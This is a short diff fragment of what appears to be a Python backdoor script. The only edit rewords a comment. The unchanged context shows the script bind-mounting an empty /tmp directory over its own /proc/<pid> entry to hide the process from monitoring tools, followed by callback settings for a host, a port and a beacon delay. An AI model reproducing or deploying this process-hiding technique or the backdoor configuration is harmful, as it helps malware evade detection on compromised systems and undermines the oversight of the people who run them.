@@ -7,7 +7,7 @@ token = "".join(r.choice(ch) for i in range(5))
 pid = os.getpid()
 os.system("mkdir /tmp/{0} && mount -o bind /tmp/{0} /proc/{1}".format(token,pid))
 
-# Parameters to change 
+# Change parameters
 host = "192.168.1.6"
 port = 8003
 delay= 900
